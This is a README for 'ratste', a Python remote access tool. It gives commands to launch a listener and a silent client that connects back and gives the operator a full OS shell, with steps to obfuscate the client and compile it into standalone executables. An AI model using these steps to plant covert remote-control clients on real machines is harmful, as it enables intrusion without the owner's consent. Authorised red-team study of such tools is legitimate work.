![ratste_logo](./images/ratste.png)

# ratste

A basic general purpose multi-platform Remote Access Tool written in Python3.

## Requirements

Both client and server components require Python 3, but only the Python Standard Library.

## Installation

Clone the GitHub repo and move into the `RATSTE_HOME` folder with:

```Bash
git clone https://github.com/StefanoRatto/ratste
cd ratste
export RATSTE_HOME=$(pwd)
```

The server and client components are single Python `.py` files and can be moved to and executed from anywhere in the file system.

The client component must be delivered to and invoked on the target machine(s) with the help of strategies and tools that are outside of the scope of the tool itself.

## Usage

### Server:

The server can be launched either without any parameter (in which case the default values of IP address `127.0.0.1` and port `7261` will be used): 

```Bash
cd $RATSTE_HOME
./ratste_server.py
```

or specifying custom bind IP address and port (in the example IP address `192.168.1.10` and port `4444`):

```Bash
cd $RATSTE_HOME
./ratste_server.py 192.168.1.10 4444
```

Once executed, the server can be interacted with via command line in the console. The server starts listening for a client to check-in and, once the server receives the connection from the client, the server immediately sends to the client the `client_discovery` command. In this way, the server is able to show which OS platform is the client running on (together with other useful information) and this information is essential for the operator to successfully interact with the client, because the server provides the operator with a command prompt that gives access not to an arbitrary and pre-defined list of available commands, but to all native commands offered by the OS platform the client is running on.

### Client:

The client can be launched either without any parameter (in which case the default values of IP address `127.0.0.1` and port `7261` will be used for the server to connect to): 

```Bash
cd $RATSTE_HOME
./ratste_client.py
```

or specifying custom server IP address and port (in the example IP address `192.168.1.10` and port `4444`):

```Bash
cd $RATSTE_HOME
./ratste_client.py 192.168.1.10 4444
```

Once executed, the client does not require any interaction, nor produces any output. The client can executed and then be sent to beckground.

## Obfuscated client module

An obfuscated (bytecode) version of the client module can be created with the command:

```Bash
cd $RATSTE_HOME
python -OO -m py_compile ratste_client.py
```

This results in a `ratste_client.pyo` file that can be executed exactly like the unobfuscated version `ratste_client.py`.

## Compiled (native) client executables

Native client executables can be created with [PyInstaller](http://www.pyinstaller.org/) on all supported platforms (Microsoft Windows, Mac OS X, Linux). 

This process has been tested and validated on all three platforms and it is recommended to run PyInstaller from within the `$RATSTE_HOME/bin` folder:

```Bash
cd $RATSTE_HOME
pyinstaller --onefile ../ratste_client.py
```

Once PyInstaller has worked its magic, the platform native single file executable can be found in the `$RATSTE_HOME/bin/dist` folder.

## Encoding and obfuscation

By design, `base64` encoding of all communications between client and server has been preferred over encryption. Communication occours over raw TCP sockets.

## Logging

The tool offers basic logging. A log file is created for each server session in the `$RATSTE_HOME/logs` folder and contains the entire output of the session (server output, user commands and client responses). Log file names and timestamps are in UTC.

## Licensing

The tool is licensed under the [GNU General Public License](https://www.gnu.org/licenses/gpl-3.0.en.html).

## Legal disclaimer

Usage of this tool to interact with targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## TODOs

* Client
  - Develop a compiled client
  - Obfuscate or encrypt client side code
  - Capable of traversing a web proxy

* Server
  - A mechanism to queue tasks for clients
  - Database Backend